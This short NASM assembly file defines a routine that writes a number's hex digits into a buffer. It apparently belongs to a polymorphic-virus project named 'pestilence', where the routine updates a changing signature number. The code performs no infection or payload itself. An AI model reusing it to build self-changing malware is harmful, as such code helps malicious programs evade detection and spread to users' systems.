%define UPDATE_POLYMORPH_NUMBER
%include "pestilence.lst"

section .text
	global _update_polymorph_number

; _update_polymorph_number(char *number, int nbr_to_add)
_update_polymorph_number:
	enter 16, 0
	add rdi, 7
	push rdi
	push rsi

	xor rcx, rcx
	.loop:
		cmp rcx, 32
		jge _end
		mov rdi, QWORD [rsp]
		shr rdi, cl
		and rdi, 0x0f
		cmp rdi, 9
		jg .letter
		add rdi, '0'
		jmp .print
		.letter:
		add rdi, 'a'
		sub rdi, 10
		.print:
		push rcx
		push rdi
		mov rdi, QWORD [rsp + 24]
		mov r10, QWORD [rsp]
		mov BYTE [rdi], r10b
		dec QWORD [rsp + 24]
		pop rdi
		pop rcx
		add rcx, 4
		jmp .loop

_end:
	leave
	ret

%undef UPDATE_POLYMORPH_NUMBER
